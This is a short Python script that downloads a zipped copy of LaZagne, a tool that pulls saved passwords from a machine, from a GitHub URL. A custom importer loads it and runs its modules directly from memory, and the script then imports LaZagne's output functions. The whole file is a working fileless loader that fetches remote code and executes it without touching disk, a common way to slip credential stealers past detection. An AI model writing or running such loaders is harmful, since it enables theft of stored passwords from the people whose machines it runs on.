import importlib.abc
import importlib.machinery
import importlib.util
import io
import sys
import urllib.request
import zipfile

# URL to the zipped lazagne dependencies [1]
REQ_ZIP_URL = "https://raw.githubusercontent.com/fvrsnr/default/main/lazagne.zip"

class MemoryZipImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    def __init__(self, zip_url):
        self.zip_url = zip_url
        self.sources = {}
        self.packages = set()
        self._load_zip_into_memory() # [1]

    def _load_zip_into_memory(self):
        """Downloads the ZIP into RAM and maps the files to module names."""
        req = urllib.request.Request(self.zip_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            zip_data = response.read()

        # Wrap the downloaded bytes in an IO buffer so zipfile can read it from RAM
        with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
            for file_info in zf.infolist():
                name = file_info.filename
                if name.endswith('/'):
                    continue
                
                # Convert ZIP file paths (e.g., lazagne/config/run.py) to Python module paths
                mod_name = name.replace('.py', '').replace('/', '.')
                if mod_name.endswith('.__init__'):
                    mod_name = mod_name[:-9]
                    self.packages.add(mod_name)
                
                self.sources[mod_name] = zf.read(name)

    def find_spec(self, fullname, path, target=None):
        """Tells Python if the requested module exists in our RAM buffer."""
        if fullname in self.sources:
            is_pkg = fullname in self.packages
            return importlib.util.spec_from_loader(fullname, self, is_package=is_pkg)
        return None

    def create_module(self, spec):
        # Return None to let Python use the default module creation semantics
        return None

    def exec_module(self, module):
        """Compiles and executes the module directly from the buffered bytes."""
        code_bytes = self.sources.get(module.__name__)
        if code_bytes is None:
            raise ImportError(f"Cannot load {module.__name__}")
        
        # Compile the raw bytes into a Python code object and execute it in the module's namespace
        code_obj = compile(code_bytes, f"memory:{module.__name__}", 'exec')
        exec(code_obj, module.__dict__)

def install_memory_zip(zip_url):
    importer = MemoryZipImporter(zip_url)
    sys.meta_path.insert(0, importer)
    return importer

# 1. Install memory dependencies BEFORE importing your modules [2]
install_memory_zip(REQ_ZIP_URL)

# 2. Now import your real program dependencies [2]
from lazagne.config.write_output import write_in_file, StandardOutput 
